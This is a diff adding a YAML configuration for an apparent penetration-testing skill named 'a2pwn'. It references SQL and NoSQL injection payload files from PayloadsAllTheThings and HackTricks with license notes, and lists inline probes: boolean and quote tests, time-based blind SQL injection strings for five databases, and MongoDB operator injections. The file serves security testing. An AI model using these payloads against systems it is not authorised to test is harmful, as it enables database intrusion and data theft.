@@ -1,0 +1,55 @@
+# SQLi payload sources — REFERENCED, never copied (license hygiene).
+# Globs resolve at load time via PayloadSource.resolve(repo_root); upstream_doc
+# entries are read by path only so CC-BY-SA prose never contaminates our AGPL skill.
+payloads:
+  - kind: glob
+    path: "vendor/PayloadsAllTheThings/SQL Injection/Intruder/*.txt"
+    license: MIT
+    credit: "swisskyrepo/PayloadsAllTheThings"
+  - kind: glob
+    path: "vendor/PayloadsAllTheThings/SQL Injection/*.md"
+    license: MIT
+    credit: "swisskyrepo/PayloadsAllTheThings"
+  - kind: glob
+    path: "vendor/PayloadsAllTheThings/NoSQL Injection/Intruder/*.txt"
+    license: MIT
+    credit: "swisskyrepo/PayloadsAllTheThings"
+  - kind: upstream_doc
+    path: "vendor/hacktricks/pentesting-web/sql-injection/README.md"
+    license: CC-BY-SA-4.0
+    credit: "HackTricks — Carlos Polop"
+
+# License-clean inline probes for fast detection before pulling the full corpus.
+inline:
+  detect:
+    kind: inline
+    license: AGPL-3.0-or-later
+    credit: "a2pwn"
+    values:
+      - "'"
+      - "''"
+      - "\""
+      - "`"
+      - " AND 1=1-- -"
+      - " AND 1=2-- -"
+      - " OR 'a'='a"
+      - " AND SLEEP(5)-- -"
+  time_blind:
+    kind: inline
+    license: AGPL-3.0-or-later
+    credit: "a2pwn"
+    values:
+      - "' AND SLEEP(5)-- -"                       # MySQL
+      - "' AND pg_sleep(5)-- -"                     # Postgres
+      - "'; WAITFOR DELAY '0:0:5'-- -"              # MSSQL
+      - "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -"  # Oracle
+      - "' AND 1=randomblob(1000000000)-- -"        # SQLite
+  nosql:
+    kind: inline
+    license: AGPL-3.0-or-later
+    credit: "a2pwn"
+    values:
+      - '{"$ne": null}'
+      - '{"$gt": ""}'
+      - '{"$where": "sleep(5000)"}'
+      - '{"$regex": "^a"}'
